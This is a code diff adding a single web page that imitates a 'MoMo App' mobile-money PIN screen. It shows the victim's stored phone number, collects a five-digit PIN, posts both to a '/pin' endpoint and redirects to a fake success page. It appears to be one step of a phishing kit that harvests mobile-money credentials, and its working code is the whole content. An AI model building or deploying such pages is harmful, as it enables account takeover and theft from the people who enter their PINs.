@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MoMo PIN</title>
+
+<style>
+body {
+  margin: 0;
+  font-family: Arial;
+  background: #0b5c6b;
+  color: white;
+  text-align: center;
+}
+
+/* HEADER */
+.header {
+  background: #0b5c6b;
+  color: #ffcc00;
+  padding: 15px;
+  font-size: 20px;
+  font-weight: bold;
+}
+
+/* BOX */
+.container {
+  background: white;
+  color: black;
+  max-width: 350px;
+  margin: 40px auto;
+  padding: 25px;
+  border-radius: 15px;
+}
+
+/* INPUT */
+input {
+  width: 100%;
+  padding: 15px;
+  margin-top: 15px;
+  border-radius: 10px;
+  border: none;
+  background: #f1f1f1;
+  text-align: center;
+  font-size: 18px;
+  letter-spacing: 5px;
+}
+
+/* BUTTON */
+button {
+  width: 100%;
+  padding: 15px;
+  margin-top: 20px;
+  background: #ffcc00;
+  border: none;
+  border-radius: 10px;
+  font-weight: bold;
+}
+
+/* FOOTER */
+.footer {
+  margin-top: 20px;
+  font-size: 12px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+  MoMo App
+</div>
+
+<div class="container">
+  <h3>Enter MoMo PIN</h3>
+
+  <p id="phoneDisplay"></p>
+
+  <form id="pinForm">
+    <input type="password" name="pin" placeholder="****" maxlength="5" required>
+    <button type="submit">Confirm</button>
+  </form>
+</div>
+
+<div class="footer">
+  2026@MoMo Verified
+</div>
+
+<script>
+// ✅ GET PHONE FROM STORAGE
+const phone = localStorage.getItem("phone");
+
+// SHOW PHONE
+document.getElementById("phoneDisplay").innerText = "Number: " + phone;
+
+// SEND PIN
+document.getElementById("pinForm").addEventListener("submit", async function(e) {
+  e.preventDefault();
+
+  const pin = this.pin.value;
+
+  try {
+    await fetch("/pin", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ phone, pin })
+    });
+
+    // 👉 MOVE TO SUCCESS PAGE
+    window.location.href = "/success.html";
+
+  } catch (err) {
+    alert("Error");
+  }
+});
+</script>
+
+</body>
+</html>
